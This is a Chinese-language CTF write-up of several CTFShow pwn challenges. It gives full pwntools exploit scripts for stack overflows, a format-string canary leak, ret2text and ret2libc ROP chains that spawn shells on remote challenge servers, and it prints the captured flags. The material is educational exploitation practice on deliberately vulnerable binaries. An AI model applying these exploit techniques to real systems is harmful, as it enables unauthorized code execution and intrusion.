![](https://paper.tanyaodan.com/CTFShow/pwn03/1.png)

用`IDA Pro 32bit`打开附件`pwn03`，按`F5`反汇编源码并查看主函数，发现`pwnme()`函数很可疑。

![](https://paper.tanyaodan.com/CTFShow/pwn03/2.png)

双击`pwnme()`函数查看详情，发现该函数中有个局部变量`s`是`char`型数组，`s`的长度只有`0x9`，即可用栈大小只有`9`字节，但是`fgets()`函数读取输入到变量`s`时限制输入`100`个字节，显然存在栈溢出漏洞。

![](https://paper.tanyaodan.com/CTFShow/pwn03/3.png)

双击`s`变量查看其在内存中的虚拟地址信息，构造`payload`时可以先用`0x9`个字节占满`s`变量，然后再加上`r`的`4`个字节。

![](https://paper.tanyaodan.com/CTFShow/pwn03/4.png)

在`Function Window`中并没有找到`system()`函数和`'/bin/sh'`字符串，但是主函数中有`puts()`函数啊！程序执行前，`got`表中存放的还是`plt`表的地址，但是程序执行后，`plt`表中存放的是`got`表的地址，`got`表中存放的是函数的真实地址。因此我们可以用`ELF`来获取`puts()`函数的`plt`表和`got`表地址，进行栈溢出并通过`puts()`函数泄露`puts()`函数在`got`表中的真实地址后，进而判断`libc`的版本，然后我们可以根据`libc`版本中`puts()`函数的偏移地址来计算出`libc`的基址地址，再根据`libc`中的`system()`函数和`'/bin/sh'`字符串的偏移地址来算出函数的真实地址，从而构造`shellcode`拿到`flag`。

编写`Python`代码即可得到`ctfshow{c7611c91-203e-47de-ac92-e0f850aa9135}`。

```python
from pwn import *
from LibcSearcher import *

context(arch='i386', os='linux', log_level='debug')
# io = process('pwn03')
io = remote('pwn.challenge.ctf.show', 28067)
e = ELF('pwn03')
puts_plt = e.plt['puts']
log.success('puts_plt => %s' % hex(puts_plt))
puts_got = e.got['puts']
log.success('puts_got => %s' % hex(puts_got))
main_address = e.symbols['main']
log.success('main_address => %s' % hex(main_address))
# 先让栈溢出，再利用puts函数的plt表地址来泄露puts函数got表中的真实地址
payload = b'a'*0x9 + b'fuck' + p32(puts_plt) + p32(main_address) + p32(puts_got)
io.sendline(payload)
io.recvuntil('\n\n')
puts_address = u32(io.recv(4)) # 接收4个字节并解包
log.success('puts_address => %s' % hex(puts_address))
libc = LibcSearcher('puts', puts_address) # 获取libc版本,libc6-i386_2.27-3ubuntu1_amd64
libcbase = puts_address - libc.dump('puts')  # libc的基址=puts()函数地址-puts()函数偏移地址(0x67360)
log.success('libcbase_address => %s' % hex(libcbase))
system_address = libcbase + libc.dump('system') # system()函数的地址=libc的基址+system()函数偏移地址(0x03cd10)
log.success('system_address => %s' % hex(system_address))
bin_sh_address = libcbase + libc.dump('str_bin_sh') # '/bin/sh'的地址=libc的基址+'/bin/sh'偏移地址(0x17b8cf)
log.success('bin_sh_address => %s' % hex(bin_sh_address))
payload = b'a'*0x9 + b'fuck' + p32(system_address) + p32(0xdeadbeef) + p32(bin_sh_address)
io.sendline(payload)
io.interactive()
```

![](https://paper.tanyaodan.com/CTFShow/pwn03/5.png)

------

### pwn04

先`file ./ex2`查看文件类型再`checksec --file=./ex2`检查文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/ctfshow]
└─$ file ./ex2 
./pwn04: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=6109b31b5fb5bcbef1eb882cf8d59afb93900352, not stripped
                                                                   
┌──(tyd㉿kali-linux)-[~/ctf/pwn/ctfshow]
└─$ checksec --file=./ex2 
[*] '/home/tyd/ctf/pwn/ctfshow/ex2'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

用`IDA Pro 32bit`打开附件`ex2`，按`F5`反汇编源码并查看主函数，发现`vuln()`函数很可疑。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  init();
  puts("Hello Hacker!");
  vuln();
  return 0;
}
```

双击进入`vuln()`函数，发现该函数存在格式化字符串漏洞。

```c
unsigned int vuln()
{
  int i; // [esp+4h] [ebp-74h]
  char buf[100]; // [esp+8h] [ebp-70h] BYREF
  unsigned int v3; // [esp+6Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  for ( i = 0; i <= 1; ++i )
  {
    read(0, buf, 0x200u);
    printf(buf);
  }
  return __readgsdword(0x14u) ^ v3;
}
```

用`pwndbg`进行分析：

```bash
$gdb ./ex2
pwndbg> disass vuln
Dump of assembler code for function vuln:
   0x0804862e <+0>:     push   ebp
   0x0804862f <+1>:     mov    ebp,esp
   0x08048631 <+3>:     sub    esp,0x78
   0x08048634 <+6>:     mov    eax,gs:0x14
   0x0804863a <+12>:    mov    DWORD PTR [ebp-0xc],eax    # canary
   0x0804863d <+15>:    xor    eax,eax
   0x0804863f <+17>:    mov    DWORD PTR [ebp-0x74],0x0
   0x08048646 <+24>:    jmp    0x8048671 <vuln+67>
   0x08048648 <+26>:    sub    esp,0x4
   0x0804864b <+29>:    push   0x200
   0x08048650 <+34>:    lea    eax,[ebp-0x70]
   0x08048653 <+37>:    push   eax
   0x08048654 <+38>:    push   0x0
   0x08048656 <+40>:    call   0x8048430 <read@plt>
   0x0804865b <+45>:    add    esp,0x10
   0x0804865e <+48>:    sub    esp,0xc
   0x08048661 <+51>:    lea    eax,[ebp-0x70]
   0x08048664 <+54>:    push   eax
   0x08048665 <+55>:    call   0x8048440 <printf@plt>    # printf地址
   0x0804866a <+60>:    add    esp,0x10
   0x0804866d <+63>:    add    DWORD PTR [ebp-0x74],0x1
   0x08048671 <+67>:    cmp    DWORD PTR [ebp-0x74],0x1
   0x08048675 <+71>:    jle    0x8048648 <vuln+26>
   0x08048677 <+73>:    nop
   0x08048678 <+74>:    mov    eax,DWORD PTR [ebp-0xc]
   0x0804867b <+77>:    xor    eax,DWORD PTR gs:0x14
   0x08048682 <+84>:    je     0x8048689 <vuln+91>
   0x08048684 <+86>:    call   0x8048450 <__stack_chk_fail@plt>
   0x08048689 <+91>:    leave  
   0x0804868a <+92>:    ret    
End of assembler dump.
pwndbg> b *0x8048665
Breakpoint 1 at 0x8048665
pwndbg> run
Starting program: /home/tyd/ctf/pwn/ctfshow/pwn04 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Hello Hacker!
AAAA  # 随便输入

Breakpoint 1, 0x08048665 in vuln ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────
 EAX  0xffffcf48 ◂— 0x41414141 ('AAAA')
 EBX  0xf7e1cff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x21cd8c
 ECX  0xffffcf48 ◂— 0x41414141 ('AAAA')
 EDX  0x200
 EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0x0
 ESI  0x80486e0 (__libc_csu_init) ◂— push   ebp
 EBP  0xffffcfb8 —▸ 0xffffcfd8 ◂— 0x0
 ESP  0xffffcf30 —▸ 0xffffcf48 ◂— 0x41414141 ('AAAA')
 EIP  0x8048665 (vuln+55) —▸ 0xfffdd6e8 ◂— 0x0
────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────
 ► 0x8048665 <vuln+55>    call   printf@plt                     <printf@plt>
        format: 0xffffcf48 ◂— 0x41414141 ('AAAA')
        vararg: 0xffffcf48 ◂— 0x41414141 ('AAAA')
 
   0x804866a <vuln+60>    add    esp, 0x10
   0x804866d <vuln+63>    add    dword ptr [ebp - 0x74], 1
   0x8048671 <vuln+67>    cmp    dword ptr [ebp - 0x74], 1
   0x8048675 <vuln+71>    jle    vuln+26                     <vuln+26>
 
   0x8048677 <vuln+73>    nop    
   0x8048678 <vuln+74>    mov    eax, dword ptr [ebp - 0xc]
   0x804867b <vuln+77>    xor    eax, dword ptr gs:[0x14]
   0x8048682 <vuln+84>    je     vuln+91                     <vuln+91>
 
   0x8048684 <vuln+86>    call   __stack_chk_fail@plt                     <__stack_chk_fail@plt>
 
   0x8048689 <vuln+91>    leave  
────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────
00:0000│ esp     0xffffcf30 —▸ 0xffffcf48 ◂— 0x41414141 ('AAAA')
01:0004│         0xffffcf34 —▸ 0xffffcf48 ◂— 0x41414141 ('AAAA')
02:0008│         0xffffcf38 ◂— 0x200
03:000c│         0xffffcf3c —▸ 0xf7c80183 (_IO_file_overflow+275) ◂— add    esp, 0x10
04:0010│         0xffffcf40 —▸ 0xf7e1dda0 (_IO_2_1_stdout_) ◂— 0xfbad2887
05:0014│         0xffffcf44 ◂— 0x0
06:0018│ eax ecx 0xffffcf48 ◂— 0x41414141 ('AAAA')
07:001c│         0xffffcf4c —▸ 0xf7e1cf0a ◂— 0xdec0f7e1
──────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────
 ► f 0 0x8048665 vuln+55
   f 1 0x80486c1 main+54
   f 2 0xf7c23295 __libc_start_call_main+117
   f 3 0xf7c23358 __libc_start_main+136
   f 4 0x80484c1 _start+33
──────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> x $ebp-0xc
0xffffcfac:     0x5222d900
pwndbg> stack 0x28
00:0000│ esp     0xffffcf30 —▸ 0xffffcf48 ◂— 0x41414141 ('AAAA')  # 栈顶 printf的地址
01:0004│         0xffffcf34 —▸ 0xffffcf48 ◂— 0x41414141 ('AAAA')
02:0008│         0xffffcf38 ◂— 0x200
03:000c│         0xffffcf3c —▸ 0xf7c80183 (_IO_file_overflow+275) ◂— add    esp, 0x10
04:0010│         0xffffcf40 —▸ 0xf7e1dda0 (_IO_2_1_stdout_) ◂— 0xfbad2887
05:0014│         0xffffcf44 ◂— 0x0
06:0018│ eax ecx 0xffffcf48 ◂— 0x41414141 ('AAAA')      # 输入字符串的起点
07:001c│         0xffffcf4c —▸ 0xf7e1cf0a ◂— 0xdec0f7e1
08:0020│         0xffffcf50 —▸ 0xf7c116e4 ◂— 0x3c04
09:0024│         0xffffcf54 ◂— 0x20 /* ' ' */
0a:0028│         0xffffcf58 —▸ 0xf7c80af9 (__overflow+9) ◂— add    ebx, 0x19c4fb
0b:002c│         0xffffcf5c —▸ 0xf7e1ba40 (_IO_file_jumps) ◂— 0x0
0c:0030│         0xffffcf60 —▸ 0xf7e1dda0 (_IO_2_1_stdout_) ◂— 0xfbad2887
0d:0034│         0xffffcf64 —▸ 0xf7e1cff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x21cd8c
0e:0038│         0xffffcf68 —▸ 0xffffcfa8 —▸ 0xffffcfd8 ◂— 0x0
0f:003c│         0xffffcf6c —▸ 0xf7c74f3b (puts+395) ◂— add    esp, 0x10
10:0040│         0xffffcf70 —▸ 0xf7e1dda0 (_IO_2_1_stdout_) ◂— 0xfbad2887
11:0044│         0xffffcf74 ◂— 0xa /* '\n' */
12:0048│         0xffffcf78 ◂— 0xd /* '\r' */
13:004c│         0xffffcf7c —▸ 0xf7c7b7b0 (setbuf) ◂— sub    esp, 0x10
14:0050│         0xffffcf80 —▸ 0xf7e1d620 (_IO_2_1_stdin_) ◂— 0xfbad208b
15:0054│         0xffffcf84 ◂— 0x7d4
16:0058│         0xffffcf88 —▸ 0x804a064 (stdout@@GLIBC_2.0) —▸ 0xf7e1dda0 (_IO_2_1_stdout_) ◂— 0xfbad2887
17:005c│         0xffffcf8c ◂— 0xd /* '\r' */
18:0060│         0xffffcf90 —▸ 0xffffcfd8 ◂— 0x0
19:0064│         0xffffcf94 —▸ 0xf7fdb8d0 (_dl_runtime_resolve+16) ◂— pop    edx
1a:0068│         0xffffcf98 —▸ 0xf7e1e9ac (_IO_stdfile_2_lock) ◂— 0x0
1b:006c│         0xffffcf9c —▸ 0xf7e1cff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x21cd8c
1c:0070│         0xffffcfa0 —▸ 0x80486e0 (__libc_csu_init) ◂— push   ebp
1d:0074│         0xffffcfa4 —▸ 0xf7ffcb80 (_rtld_global_ro) ◂— 0x0
1e:0078│         0xffffcfa8 —▸ 0xffffcfd8 ◂— 0x0
1f:007c│         0xffffcfac ◂— 0x5222d900   # canary偏移量为0x1f即31,可以通过%31$x泄露
20:0080│         0xffffcfb0 —▸ 0x8048768 ◂— dec    eax /* 'Hello Hacker!' */
21:0084│         0xffffcfb4 —▸ 0xf7fd98cb (_dl_fixup+235) ◂— mov    edi, eax
22:0088│ ebp     0xffffcfb8 —▸ 0xffffcfd8 ◂— 0x0
23:008c│         0xffffcfbc —▸ 0x80486c1 (main+54) ◂— mov    eax, 0
24:0090│         0xffffcfc0 —▸ 0xffffd000 —▸ 0xf7e1cff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x21cd8c
25:0094│         0xffffcfc4 —▸ 0xf7fc1678 —▸ 0xf7ffdbac —▸ 0xf7fc1790 —▸ 0xf7ffda40 ◂— ...
26:0098│         0xffffcfc8 —▸ 0xf7fc1b40 —▸ 0xf7c1f2bc ◂— 'GLIBC_PRIVATE'
27:009c│         0xffffcfcc ◂— 0x5222d900  # ret地址
```

字符串起点到`canary`的长度为`0xffffcfac-0xffffcf48=100`，因此构造`payload`时先用`100`个字节填充`padding`，接着写入`canary`的值，接着填充`0xffffcfc8-0xffffcfbc=12`个字节，最后用`getshell`的地址覆盖掉返回地址。

编写`Python`代码求解，得到`ctfshow{65bab64a-1dc2-4524-a1aa-227f6b5ec590}`。

```python
from pwn import *

context(arch='i386', os='linux', log_level='debug')
io = remote('pwn.challenge.ctf.show', 28105)
elf = ELF('./pwn04')
getshell = elf.symbols['getshell']  # 0x804859b
log.success('getshell => %s', hex(getshell))
io.recvuntil('Hello Hacker!\n')
io.sendline(b'%31$x')
canary = int(io.recv(), 16)
payload = b'a'*100 + p32(canary) + b'a'*12 + p32(getshell)
io.sendline(payload)
io.interactive()
```

------

### pwn05

先`file ./pwn05`查看文件类型再`checksec --file=pwn05`检查一下文件保护情况。

![](https://paper.tanyaodan.com/CTFShow/pwn05/1.png)

用`IDA Pro 32bit`打开附件`pwn05`，按`F5`反汇编源码并查看主函数，发现`welcome()`函数很可疑。

![](https://paper.tanyaodan.com/CTFShow/pwn05/2.png)

双击进入`welcome()`函数，可以看到该函数中有个局部变量`s`是`char`型数组，`s`的长度只有`0x14`，但是`gets()`函数并没有限制输入，显然存在栈溢出漏洞。

![](https://paper.tanyaodan.com/CTFShow/pwn05/3.png)

双击`s`变量查看其在内存中的虚拟地址信息，构造`payload`时可以先用`0x14`个字节占满`s`变量，然后再加上`r`的`4`个字节。

![](https://paper.tanyaodan.com/CTFShow/pwn05/4.png)

在`Function Window`中注意到有一个名为`getFlag()`的函数，函数返回值直接是系统调用，因此构造`payload`时需要再加上这个`getFlag()`函数的起始地址即可。

![](https://paper.tanyaodan.com/CTFShow/pwn05/5.png)

编写`Python`代码即可得到`ctfshow{ea894e9a-2450-417a-92f3-7ff289ce115e}`。

```python
from pwn import *

io = remote('pwn.challenge.ctf.show', 28182)
e = ELF('pwn05')
address = e.symbols['getFlag']
log.success('getFlag_address => %s' % hex(address).upper())
payload = b'a'*(0x14 + 0x4) + p32(address)
# payload = b'a'*(0x14 + 0x4) + p32(0x8048486)
io.sendline(payload)
io.interactive()
```

![](https://paper.tanyaodan.com/CTFShow/pwn05/6.png)

------

### pwn06

先`file ./pwn06`查看文件类型和`checksec --file=pwn06`检查一下文件保护情况。

![](https://paper.tanyaodan.com/CTFShow/pwn06/1.png)

用`IDA Pro 64bit`打开附件`pwn06`，按`F5`反汇编源码并查看主函数，发现`welcome()`函数很可疑。

![](https://paper.tanyaodan.com/CTFShow/pwn06/2.png)

双击进入`welcome()`函数，可以看到该函数中有个局部变量`s`是`char`型数组，`s`的长度只有`0xc`，但是`gets()`函数并没有限制输入，显然存在栈溢出漏洞。

![](https://paper.tanyaodan.com/CTFShow/pwn06/3.png)

双击`s`变量查看其在内存中的虚拟地址信息，构造`payload`时可以先用`0x14`个字节占满`s`变量，然后再加上`r`的`8`个字节。

![](https://paper.tanyaodan.com/CTFShow/pwn06/4.png)

需要注意的是这题`pwn06`就是上一题`pwn05`的`64`位版本，所以需要加上`welcome()`函数的起始地址来平衡堆栈。

在`Function Window`中注意到有一个名为`getFlag()`的函数，函数返回值直接是系统调用，因此构造`payload`时需要再加上这个`getFlag()`函数的起始地址即可。

![](https://paper.tanyaodan.com/CTFShow/pwn06/5.png)

编写`Python`代码即可得到`ctfshow{384e6120-ef80-45f0-afe9-f64929450397}`。

```python
from pwn import *

io = remote('pwn.challenge.ctf.show', 28194)
e = ELF('pwn06')
welcome_address = e.symbols['welcome']
log.success('welcome_address => %s' % hex(welcome_address).upper())
getFlag_address = e.symbols['getFlag']
log.success('getFlag_address => %s' % hex(getFlag_address).upper())
payload = b'a'*0xc + b'fuckpwn!' + p64(welcome_address) + p64(getFlag_address)
# payload = b'a'*0xc + b'fuckpwn!' + p64(0x40058F) + p64(0x400577)
io.sendline(payload)
io.interactive()
```

------

### pwn07

先`file ./pwn07`查看文件类型再`checksec --file=pwn07`检查了一下文件保护情况。

![](https://paper.tanyaodan.com/CTFShow/pwn07/1.png)

用`IDA Pro 64bit`打开附件`pwn07`，按`F5`反汇编源码并查看主函数，发现`welcome()`函数很可疑。

![](https://paper.tanyaodan.com/CTFShow/pwn07/2.png)

双击`welcome()`函数查看详情，发现该函数中有个局部变量`s`是`char`型数组，`s`的长度只有`0xc`，即可用栈大小只有`12`字节，但是`gets()`函数读取输入到变量`s`时并没有限制输入，显然存在栈溢出漏洞。

![](https://paper.tanyaodan.com/CTFShow/pwn07/3.png)

双击`s`变量查看其在内存中的虚拟地址信息，构造`payload`时可以先用`0xc`个字节占满`s`变量，然后再加上`r`的`4`个字节。

![](https://paper.tanyaodan.com/CTFShow/pwn07/4.png)

有没有发现这题`pwn07`和上面的`pwn03`很像？没错，这简直就是`pwn03`的`64`位版本，不过在`64`位程序中，函数的前`6`个参数是通过寄存器传递的，分别是`rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9`(当参数小于`7`时)，所以我们需要用`ROPgadget`找到`pop_rdi`和`pop_ret`的地址。

```bash
ROPgadget --binary ./pwn07 --only "pop|ret"
```

![](https://paper.tanyaodan.com/CTFShow/pwn07/5.png)

解题思路都是：在`Function Window`中并没有找到`system()`函数和`'/bin/sh'`字符串，但是主函数中有`puts()`函数啊！程序执行前，`got`表中存放的还是`plt`表的地址，但是程序执行后，`plt`表中存放的是`got`表的地址，`got`表中存放的是函数的真实地址。因此我们可以用`ELF`来获取`puts()`函数的`plt`表和`got`表地址，进行栈溢出并通过`puts()`函数泄露`puts()`函数在`got`表中的真实地址后，进而判断`libc`的版本，然后我们可以根据`libc`版本中`puts()`函数的偏移地址来计算出`libc`的基址地址，再根据`libc`中的`system()`函数和`'/bin/sh'`字符串的偏移地址来算出函数的真实地址，从而构造`shellcode`拿到`flag`。这种类型的题还是有一定套路的：

```python
e = ELF('pwn')
# 获取32位版本的got表中的xx函数真实地址,再根据libc中xx函数的偏移地址来算出libc的基址地址
payload = b'a'*offset + p32(e.plt['xx']) + p32(ret_address) + p32(e.got['xx'])
# 根据libc的基址地址和偏移地址算出system()和'/bin/sh'的真实地址后,构造32位版本的shellcode
payload = b'a'*offset + p32(system_address) + p32(0) + p32(bin_sh_address) #p32(0xdeadbeef)或p32(0)或b'a'*4

# 获取64位版本的got表中的xx函数真实地址,再根据libc中xx函数的偏移地址来算出libc的基址地址
payload = b'a'*offset + p64(pop_rdi) + p64(e.got['xx']) + p64(e.plt['xx']) + p64(ret_address)
# 根据libc的基址地址和偏移地址算出system()和'/bin/sh'的真实地址后,构造64位版本的shellcode
payload = b'a'*offset + p64(ret_address) + p64(pop_rdi) + p64(bin_sh_address) + p64(system_address)
```

编写`Python`代码即可得到`ctfshow{03a97f04-a802-4c2e-a013-b86a120f034f}`。

```python
from pwn import *
from LibcSearcher import *

context(arch='amd64', os='linux', log_level='debug')
# io = process('pwn07')
io = remote('pwn.challenge.ctf.show', 28199)
e = ELF('pwn07')
puts_plt = e.plt['puts']
log.success('puts_plt => %s' % hex(puts_plt))
puts_got = e.got['puts']
log.success('puts_got => %s' % hex(puts_got))
pop_rdi = 0x4006e3 # ROPgadget --binary ./pwn07 --only "pop|ret"
main_address = e.symbols['main']
log.success('main_address => %s' % hex(main_address))
payload = b'a'*0xc + b'fuckpwn!' + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_address)
io.sendline(payload)
io.recvline()
puts_address = io.recv().strip(b'\n')
log.success('io.recv().strip(b\\n\') => %s', puts_address)
puts_address = u64(puts_address.ljust(8, b'\x00'))  # 地址只有6bytes, 补到8位才能unpack
log.success('puts_address => %s' % hex(puts_address))
libc = LibcSearcher('puts', puts_address) # 获取libc版本, libc6_2.31-8_amd64
libcbase = puts_address - libc.dump('puts') # libc的基址=puts()函数地址-puts()函数偏移地址
log.success('libcbase_address => %s' % hex(libcbase))
system_address = libcbase + libc.dump('system')
log.success('system_address => %s' % hex(system_address)) # system()函数的地址=libc的基址+system()函数偏移地址
bin_sh_address = libcbase + libc.dump('str_bin_sh') # '/bin/sh'的地址=libc的基址+'/bin/sh'偏移地址
log.success('bin_sh_address => %s' % hex(bin_sh_address))
pop_ret = 0x4004c6 # ROPgadget --binary ./pwn07 --only "pop|ret"
payload = b'a'*0xc + b'fuckpwn!' + p64(pop_ret) + p64(pop_rdi) + p64(bin_sh_address) + p64(system_address) 
io.sendline(payload)
io.interactive()
```

![](https://paper.tanyaodan.com/CTFShow/pwn07/6.png)

------

### ret2text

先`file ./ret2text`查看文件类型再`checksec --file=ret2text`检查了一下文件保护情况。

![](https://paper.tanyaodan.com/CTFShow/ret2text/1.png)

用`IDA Pro 64bit`打开附件`ret2text`，按`F5`反汇编源码并查看主函数，发现`welcome()`函数很可疑。

![](https://paper.tanyaodan.com/CTFShow/ret2text/2.png)

双击`welcome()`函数查看详情，发现该函数中有个局部变量`s`是`char`型数组，`s`的长度只有`0x80`，即可用栈大小只有`128`字节，但是`gets()`函数读取输入到变量`s`时并没有限制输入，显然存在栈溢出漏洞。

![](https://paper.tanyaodan.com/CTFShow/ret2text/3.png)

在`Function Window`中注意到有一个名为`ctfshow()`的函数，函数返回值直接是系统调用`system('/bin/sh')`。

![](https://paper.tanyaodan.com/CTFShow/ret2text/4.png)

构造`payload`时可以先用`0x80`个字节占满`s`变量，再加上`rbp`的`8`个字节，然后加上`ctfshow()`函数的起始地址即可。然而我第一次编写的`Python`代码直接超时啦`timeout: the monitored command dumped core`。

```python
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
# io = process('ret2text')
io = remote('pwn.challenge.ctf.show', 28067)
e = ELF('ret2text')
ctfshow_address = e.symbols['ctfshow']
log.success('ctfshow_address => %s' % hex(ctfshow_address).upper())
payload = b'a'*0x80 + b'fuckpwn!' + p64(ctfshow_address)
# payload = b'a'*0x80 + b'fuckpwn!' + p64(0x400637)
io.sendline(payload)
io.interactive()
```

那`payload`就不要加上`ctfshow()`函数的起始地址了，直接添加系统调用`system('/bin/sh')`的地址`0x40063B`。

![](https://paper.tanyaodan.com/CTFShow/ret2text/5.png)

编写`Python`代码即可得到`ctfshow{19efd671-89fa-4f27-8898-aaedfea5bb2c}`。

```python
from pwn import *

io = remote('pwn.challenge.ctf.show', 28067)
payload = b'a'*0x80 + b'fuckpwn!' + p64(0x40063B)
io.sendline(payload)
io.interactive()
```

![](https://paper.tanyaodan.com/CTFShow/ret2text/6.png)

------

### babystack

同[**bjdctf_2020_babystack**](https://buuoj.cn/challenges#bjdctf_2020_babystack)

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
# io = process('./ret2text')
io = remote('pwn.challenge.ctf.show', 28117)
e = ELF('./ret2text')
io.sendlineafter(b'Please input the length of your name:', b'100')
backdoor_address = e.symbols['backdoor'] # 0x4006E6
log.success('backdoor_address => %s' % hex(backdoor_address))
payload = b'a'*0x10 + b'fuckpwn!' + p64(backdoor_address)
io.sendlineafter(b'What\'s u name?', payload)
io.interactive()
```

### babyroute

同[**bjdctf_2020_babyrop**](https://buuoj.cn/challenges#bjdctf_2020_babyrop)

```python
from pwn import *
from LibcSearcher import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('pwn.challenge.ctf.show', 28052)
e = ELF('./babyrouter')
puts_plt = e.plt['puts']
log.success('puts_plt => %s' % hex(puts_plt))
puts_got = e.got['puts']
log.success('puts_got => %s' % hex(puts_got))
main_address = e.symbols['main']
log.success('main_address => %s' % hex(main_address))
pop_rdi = 0x400733 # ROPgadget --binary ./babyrouter --only "pop|ret"
payload = b'a'*0x20 + b'fuckpwn!' + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_address)
io.sendlineafter(b'Pull up your sword and tell me u story!\n', payload)
puts_address = u64(io.recvline().strip(b'\n').ljust(8, b'\x00'))
log.success('puts_address => %s' % hex(puts_address))
libc = LibcSearcher('puts', puts_address) # 获取libc版本, libc6_2.23-0ubuntu11_amd64
libcbase = puts_address - libc.dump('puts') # libc的基址=puts()函数地址-puts()函数偏移地址
log.success('libcbase_address => %s' % hex(libcbase))
system_address = libcbase + libc.dump('system') # system()函数的地址=libc的基址+system()函数偏移地址
log.success('system_address => %s' % hex(system_address))
bin_sh_address = libcbase + libc.dump('str_bin_sh') # '/bin/sh'的地址=libc的基址+'/bin/sh'偏移地址
log.success('bin_sh_address => %s' % hex(bin_sh_address))
pop_ret = 0x4004c9 # ROPgadget --binary ./babyrouter --only "pop|ret"
payload = b'a'*0x20 + b'fuckpwn!' + p64(pop_ret) + p64(pop_rdi) + p64(bin_sh_address) + p64(system_address)
io.sendlineafter(b'Pull up your sword and tell me u story!\n', payload)
io.interactive()
```

------

### 1024_happy_stack

先`file ./1024_happy_stack`查看文件类型再`checksec --file=1024_happy_stack`检查了一下文件保护情况。

![](https://paper.tanyaodan.com/CTFShow/1024_happy_stack/1.png)

用`IDA Pro 64bit`打开附件`1024_happy_stack`，按`F5`反汇编源码并查看主函数，发现有个`char`型数组变量`s`，`s`的长度只有`0x380`，但是`gets()`函数读取输入到变量`s`时并没有限制输入，显然存在栈溢出漏洞。注意到`ctfshow()`函数的返回值为真时会结束程序。

![](https://paper.tanyaodan.com/CTFShow/1024_happy_stack/2.png)

双击`ctfshow()`函数查看详情，函数返回值直接是`strcmp()`的比较结果。`strcmp()`函数是用于比较两个字符串并根据比较结果返回整数。基本形式为`strcmp(str1,str2)`，若`str1=str2`，则返回零；若`str1<str2`，则返回负数；若`str1>str2`，则返回正数。也就是说从`main()`函数中传入的参数和字符串`"36D"`的`strcmp()`比较结果必须为`0`才能执行主函数中的`puts()`函数。有什么办法能够让变量`s`造成栈溢出的同时又能与`"36D"`的比较结果相等呢？构造`payload`时可以利用`\x00`来让`s`和`"36D"`匹配上。

![](https://paper.tanyaodan.com/CTFShow/1024_happy_stack/3.png)

在`Function Window`中并没有找到`system()`函数和`'/bin/sh'`字符串，但是主函数中有`puts()`函数啊！程序执行前，`got`表中存放的还是`plt`表的地址，但是程序执行后，`plt`表中存放的是`got`表的地址，`got`表中存放的是函数的真实地址。因此我们可以用`ELF`来获取`puts()`函数的`plt`表和`got`表地址，进行栈溢出并通过`puts()`函数泄露`puts()`函数在`got`表中的真实地址后，进而判断`libc`的版本，然后我们可以根据`libc`版本中`puts()`函数的偏移地址来计算出`libc`的基址地址，再根据`libc`中的`system()`函数和`'/bin/sh'`字符串的偏移地址来算出函数的真实地址，从而构造`shellcode`拿到`flag`。

在`64`位程序中，函数的前`6`个参数是通过寄存器传递的，分别是`rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9`(当参数小于`7`时)，所以我们需要用`ROPgadget`找到`pop_rdi`和`pop_ret`的地址。

![](https://paper.tanyaodan.com/CTFShow/1024_happy_stack/4.png)

编写`Python`代码即可得到`ctfshow{ed60fbe2-5815-456a-abc1-4b45fd120cf0}`。

```python
from pwn import *
from LibcSearcher import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('pwn.challenge.ctf.show', 28088)
# io = process('./1024_happy_stack')
e = ELF('./1024_happy_stack')
payload = b'36D\x00'.ljust(0x388, b'a')
pop_rdi = 0x400803 # ROPgadget --binary ./1024_happy_stack --only "pop|ret"
puts_plt = e.plt['puts']
info('puts_plt => 0x%x', puts_plt)
puts_got = e.got['puts']
info('puts_got => 0x%x', puts_got)
main_address = e.symbols['main']
payload += flat(pop_rdi, puts_got, puts_plt, main_address)
io.recv()
io.sendline(payload)
io.recvuntil(b'36D\n')
puts_address = u64(io.recv(6).ljust(8, b'\x00'))
log.success('puts_address => 0x%x', puts_address)
pop_ret = 0x40028a # ROPgadget --binary ./1024_happy_stack --only "pop|ret"
libc = LibcSearcher('puts', puts_address) # 获取libc版本, libc6_2.27-3ubuntu1_amd64
libcbase = puts_address - libc.dump('puts')
system_address = libcbase + libc.dump('system')
info('system_address => 0x%x', system_address)
bin_sh_address = libcbase + libc.dump(('str_bin_sh'))
info('bin_sh_address => 0x%x', bin_sh_address)
payload = b'36D\x00'.ljust(0x388, b'a')
payload += flat(pop_ret, pop_rdi, bin_sh_address, system_address)
io.sendline(payload)
io.interactive()
```

![](https://paper.tanyaodan.com/CTFShow/1024_happy_stack/5.png)

------

------

### 1024_happy_checkin

先`file ./1024_happy_checkin`查看文件类型再`checksec --file=1024_happy_checkin`检查了一下文件保护情况。

![](https://paper.tanyaodan.com/CTFShow/1024_happy_checkin/1.png)

用`IDA Pro 64bit`打开附件`1024_happy_checkin`，按`F5`反汇编源码并查看主函数，发现有个`char`型数组变量`s`，`s`的长度只有`0x370`，但是`gets()`函数读取输入到变量`s`时并没有限制输入，显然存在栈溢出漏洞。

